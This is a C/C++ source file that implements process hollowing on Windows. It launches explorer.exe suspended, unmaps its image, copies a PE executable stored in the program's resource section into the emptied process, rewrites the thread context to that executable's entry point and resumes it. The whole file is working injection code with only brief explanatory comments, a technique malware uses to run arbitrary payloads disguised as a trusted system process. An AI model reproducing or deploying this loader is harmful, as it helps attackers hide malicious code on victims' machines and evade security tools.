#include <stdio.h>
#include "helper.h"
#include <windows.h>
#include <wdbgexts.h>
#include "resource.h"

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	HINSTANCE handleNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleNtDll, "NtQueryInformationProcess");
	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleNtDll, "ZwUnmapViewOfSection");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;

	
	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed: %i.\n", GetLastError());
	}

	PROCESS_BASIC_INFORMATION pbi;
	PULONG returnLength = NULL;

	/* Retrieves ProcessBasicInformaton info from the created process */
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	/* Retrieves PEB info of the created process */
	PPEB pPeb = new PEB();
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pPeb, sizeof(PEB), 0);

	/* Unmap the virtual memory allocated to the created processes image */
	ZwUnmapViewOfSection(pi.hProcess, pPeb->ImageBaseAddress);

	/* Find and load exe stored in the PE's resource section */
	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL resourceData = LoadResource(NULL, resource);

	/* Get pointer to the resource base address */
	LPVOID lpBaseAddressResource = LockResource(resourceData);

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddressResource;

	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) 
	{
		printf("Failed: .exe does not have a valid DOS signature %i", GetLastError());
	}
		
	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);
	
	/* Allocate virtual memory for the process which is to be injected */
	VirtualAllocEx(pi.hProcess, pPeb->ImageBaseAddress, pNTHeaderResource->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	PBYTE pHeader = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];

	memcpy(pHeader, pDosHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders);

	/* Copy the headers of the process that is to be injected into the created process */
	if (!WriteProcessMemory(pi.hProcess, pPeb->ImageBaseAddress, pHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
	{
		printf("Failed: Unable to write headers: %i", GetLastError());
		return -1;
	}

	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNTHeaderResource);

	/* Copy the sections of the process that is to be injected into the created process */
	for (int i = 0; i < pNTHeaderResource->FileHeader.NumberOfSections; i++)
	{
		printf("Copying data from: %s\n", pSectionHeader->Name);

		PBYTE section = new BYTE[(DWORD)pSectionHeader->SizeOfRawData];
		memcpy(section, (PVOID)((DWORD)pDosHeader + (DWORD)pSectionHeader->PointerToRawData), (DWORD)pSectionHeader->SizeOfRawData);

		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pSectionHeader->VirtualAddress), section, (DWORD)pSectionHeader->SizeOfRawData, NULL))
		{
			printf("Failed copying data from %s: %i", pSectionHeader->Name, GetLastError());
			return -1;
		}
		pSectionHeader++;
	}
	
	/* Retrieve the suspended procceses current context */
	PCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, lpContext);

	/* Set the Orginal Entry Point (OEP) value */
	lpContext->Eax = (DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderResource->OptionalHeader.AddressOfEntryPoint;

	/* Set the suspended exe context with the updated eax value which points to the injected code */
	SetThreadContext(pi.hThread, lpContext);

	/* Resume the created processes main thread with the updated OEP */
	ResumeThread(pi.hThread);


	printf("\nCreated Process id: %i\n", pi.dwProcessId);
	printf("Created process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);
	printf("Created process Image Base Address 0x%x\n", pPeb->ImageBaseAddress);
	printf("Injected process Image Base Address 0x%x\n", pNTHeaderResource->OptionalHeader.ImageBase);

	return 0;
}